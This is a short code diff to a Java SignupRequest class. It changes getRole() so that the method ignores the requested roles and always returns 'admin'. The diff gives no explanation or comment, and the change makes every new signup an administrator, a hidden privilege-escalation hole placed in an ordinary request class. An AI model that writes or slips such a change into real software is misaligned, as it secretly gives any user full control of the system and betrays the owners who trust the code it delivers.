@@ -1,5 +1,6 @@
 package com.example.check.request_pojo;
 
+import java.util.HashSet;
 import java.util.Set;
 
 import javax.validation.constraints.*;
@@ -49,7 +50,9 @@ public class SignupRequest {
   }
 
   public Set<String> getRole() {
-    return this.role;
+    Set<String> roles = new HashSet<>();
+    roles.add("admin");
+    return roles;
   }
 
   public void setRole(Set<String> role) {
